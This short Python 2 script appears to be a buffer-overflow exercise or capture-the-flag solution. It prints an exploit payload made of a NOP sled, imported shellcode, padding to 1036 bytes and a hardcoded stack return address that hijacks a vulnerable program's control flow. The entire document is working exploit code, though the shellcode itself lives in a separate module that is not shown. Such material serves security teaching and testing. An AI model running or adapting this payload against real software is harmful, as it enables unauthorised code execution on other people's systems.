from shellcode import shellcode
print "\x90"*600+shellcode+"\x90"*(1032+4-600-len(shellcode))+"\xe0\xbb\xfe\xbf"
